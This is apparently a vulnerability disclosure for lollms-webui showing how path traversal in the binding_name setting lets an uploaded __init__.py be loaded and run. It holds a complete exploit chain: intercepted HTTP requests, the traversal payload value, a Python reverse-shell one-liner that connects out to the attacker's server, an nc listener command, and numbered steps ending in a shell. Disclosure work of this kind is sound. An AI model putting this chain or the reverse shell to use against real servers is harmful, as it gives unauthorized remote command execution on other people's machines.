@@ -1,0 +1,149 @@
+# Description
+In `./lollms-webui/lollms_core/lollms/server/endpoints/lollms_binding_infos.py` users can change their binding for `lollms`, However, **path traversal allows users to cd to Arbitrary directory, which the server further loads the `__init__.py` file, causing Arbitrary Code Execution**.
+
+ # Proof of Concept
+When users are switching their `bindings` in `Web UI` (Clicking to other `bindings`), it will send a request of:
+
+```yaml
+POST /update_setting HTTP/1.1
+Host: localhost:9600
+Content-Length: 57
+sec-ch-ua: 
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
+sec-ch-ua-platform: ""
+Origin: http://localhost:9600
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:9600/settings/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+{
+    "setting_name":"binding_name",
+    "setting_value":"litellm"
+}
+```
+
+However, due to lack of sanitizations, the server allows us to enter relative path such as `../../../../`, allowing us to travel to everywhere in the server.
+
+```python
+@router.post("/update_setting")
+async def update_setting(request: Request):
+    """
+    Endpoint to apply configuration settings.
+
+    :param request: The HTTP request object.
+    :return: A JSON response with the status of the operation.
+    """
+
+    try:
+        config_data = (await request.json())
+        if "config" in config_data.keys():
+            config_data = config_data["config"]
+        setting_name = config_data["setting_name"]
+        setting_value = config_data["setting_value"]
+
+        ASCIIColors.info(f"Requested updating of setting {setting_name} to {setting_value}")
+        if setting_name== "binding_name":
+            if lollmsElfServer.config['binding_name']!= setting_value:
+                print(f"New binding selected : {setting_value}")
+                lollmsElfServer.config["binding_name"]=setting_value
+                try:
+                    if lollmsElfServer.binding:
+                        lollmsElfServer.binding.destroy_model()
+                    lollmsElfServer.binding = None
+                    lollmsElfServer.model = None
+                    for per in lollmsElfServer.mounted_personalities:
+                        if per is not None:
+                            per.model = None
+                    gc.collect()
+                    lollmsElfServer.binding = BindingBuilder().build_binding(lollmsElfServer.config, lollmsElfServer.lollms_paths, InstallOption.INSTALL_IF_NECESSARY, lollmsCom=lollmsElfServer)
+                    # Here the server initalized BindingBuilder
+                    lollmsElfServer.model = None
+                    lollmsElfServer.config.save_config()
+```
+
+Additionally, we can see here that the server initalized the `BindingBuilder`class
+
+## Arbitrary Code Execution
+
+```python
+	# lollms-webui/lollms_core/lollms/binding.py, class "BindingBuilder"
+       if len(str(config.binding_name).split("/"))>1:
+            binding_path = Path(config.binding_name)
+        else:
+            binding_path = lollms_paths.bindings_zoo_path / config["binding_name"]
+
+        # define the full absolute path to the module
+        absolute_path = binding_path.resolve()
+        # infer the module name from the file path
+        module_name = binding_path.stem
+        # use importlib to load the module from the file path
+        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
+        binding_module = loader.load_module()
+```
+
+In the class `BindingBuilder`, the server will use `importlib.machinery.SourceFileLoader` to load an internal `__init__.py`. This approach allows the program to dynamically load and use Python modules at runtime, instead of statically importing them at the time of code writing.
+
+However, by exploiting the previous `path traversal`, we can manipulate our `binding_path` to an arbitrary location, including the directory for discussion's uploads. in which we can upload freely, and create an `__init__.py` look like:
+
+```python
+import os
+os.system("touch /home/retr0/PoC/sensitive/hackedd")
+```
+
+After the `__init__.py` is loaded via `importlib.machinery.SourceFileLoader`, we can execute arbitrary commands and create a reverse shell, etc.
+
+ Exploiting
+
+1. create a `__init__.py` contains your payload, for instance:
+
+   ```python
+   # __init__.py
+   import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<YOUR_SERVER>,<YOUR_PORTS>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+   ```
+
+2. Change the `database` name via `/select_database` to `""(No character)`(This seemed bit weird but because `pydantic` only allow payload within `50 character`) 
+
+   ```python
+   >>> len("../personal_data/discussion_databases/default/0/text_data") # Using default
+   57
+   >>> len("../personal_data/discussion_databases/0/text_data") # Using ""
+   49
+   ```
+
+   `/select_database` is accessed via `discussion -> export database -> Add new (name must not be Null here) -> Vaildate - burpsuite -> Change the "name":"<random>" in to "name":"" `
+
+3. Upload your `__init__.py` via `discussion -> Send file to AI`
+
+4. Set-up listen server in your server, instance: `nc -lvnp 4444`
+
+5. Go-to `setting -> binding zoo ` select any binds you want.
+
+6. intercepts the request and modify:
+
+   ```json
+   {
+       "setting_name":"binding_name",
+       "setting_value":"litellm"
+   }
+   ```
+
+   into:
+
+   ```python
+   {
+       "setting_name":"binding_name",
+       "setting_value":"../personal_data/discussion_databases/<your_index>/text_data"
+   }
+   ```
+
+   ( Your index can be know by intercepting request when entering a discussion )
+
+7. You will receive a reverse-shell connection!
+
